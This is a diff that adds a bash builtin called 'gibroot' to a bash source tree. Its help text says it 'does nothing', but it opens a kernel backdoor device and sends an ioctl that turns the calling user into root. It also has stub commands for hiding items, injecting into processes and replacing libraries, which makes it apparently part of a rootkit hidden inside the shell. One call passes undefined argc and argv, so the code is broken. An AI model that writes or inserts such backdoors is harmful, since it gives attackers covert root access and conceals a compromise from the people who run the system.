@@ -1,0 +1,143 @@
+$PRODUCES gibroot.c
+$BUILTIN gibroot
+$FUNCTION gibroot_builtin
+$SHORT_DOC gibroot
+does nothing
+:-)
+$END
+
+#include <config.h>
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <errno.h>
+#include "../bashtypes.h"
+#include "../bashintl.h"
+#include "../shell.h"
+#include "common.h"
+#include "../../bdoor_common.h"
+
+#define ROOT_CMD "root"
+#define URAND_CMD "urand"
+#define HIDE_CMD "hide"
+#define SHOW_CMD "show"
+#define LIST_HIDDEN_CMD "list"
+#define INJECT_CMD "inject"
+#define REPLACE_CMD "replace"
+
+static int backdoor_fd;
+
+static int open_device(void)
+{
+	backdoor_fd = open(BDOOR_DEV_PATH,O_RDONLY);
+	printf("file descriptor:%d\n",backdoor_fd);
+	if (backdoor_fd == -1)
+		return -1;
+	return 0;
+}
+
+static void close_device(void)
+{
+	close(backdoor_fd);
+}
+
+static int make_root(list) WORD_LIST *list;
+{
+	int res;
+	int ret;
+	printf("uid before ioctl:%lu\n",getuid());
+	res = ioctl(backdoor_fd,ROOT_IOCTL,NULL);
+	printf("uid after ioctl:%lu\n",getuid());
+	if (res == 0) {
+		printf("successfully rooted user\n");
+		ret = EXECUTION_SUCCESS;
+	} else {
+		perror("ERROR ROOTING USER");
+		ret = EXECUTION_FAILURE;
+	}
+	return ret;
+}
+
+static int toggle_urandom(list) WORD_LIST *list;
+{
+	printf("not yet implemented\n");
+	return 0;
+}
+
+static int hide_item(list) WORD_LIST *list;
+{
+	printf("not yet implemented\n");
+	return 0;
+}
+
+static int show_item(list) WORD_LIST *list;
+{
+	printf("not yet implemented\n");
+	return 0;
+}
+
+static int list_hidden_items(list) WORD_LIST *list;
+{
+	printf("not yet implemented\n");
+	return 0;
+}
+
+static int inject_pid(list) WORD_LIST *list;
+{
+	printf("not yet implemented\n");
+	return 0;
+}
+
+static int replace_libs(list) WORD_LIST *list;
+{
+	printf("not yet implemented\n");
+	return 0;
+}
+
+
+static int get_first_arg(list) WORD_LIST *list;
+{
+	char *word = list->word->word;
+	if (!strncmp(word,ROOT_CMD,strlen(ROOT_CMD))) {
+		return make_root(list->next);
+	} else if (!strncmp(word,URAND_CMD,strlen(URAND_CMD))) {
+		return toggle_urandom(list->next);
+	} else if (!strncmp(word,HIDE_CMD,strlen(HIDE_CMD))) {
+		return hide_item(list->next);
+	} else if (!strncmp(word,SHOW_CMD,strlen(SHOW_CMD))) {
+                return show_item(list->next);
+	} else if (!strncmp(word,LIST_HIDDEN_CMD,strlen(LIST_HIDDEN_CMD))) {
+                return list_hidden_items(list->next);
+	} else if (!strncmp(word,INJECT_CMD,strlen(INJECT_CMD))) {
+                return inject_pid(list->next);
+	} else if (!strncmp(word,REPLACE_CMD,strlen(REPLACE_CMD))) {
+                return replace_libs(list->next);
+	} else {
+		printf("ERROR: invalid command\n");
+		return EXECUTION_FAILURE;
+	}
+}
+
+int gibroot_builtin(list) 
+	WORD_LIST *list;
+{
+	int ret = 0;
+	if (open_device() == -1) {
+		printf("ERROR: backend device not registered\n");
+		ret = EXECUTION_FAILURE;
+		goto out;
+	}
+	if (list == 0) {
+		printf("ERROR: need at least one argument\n");
+		ret = EXECUTION_FAILURE;
+	} else {
+		ret = get_first_arg(argc,argv);
+	}
+	close_device();
+out:
+	return ret;
+}
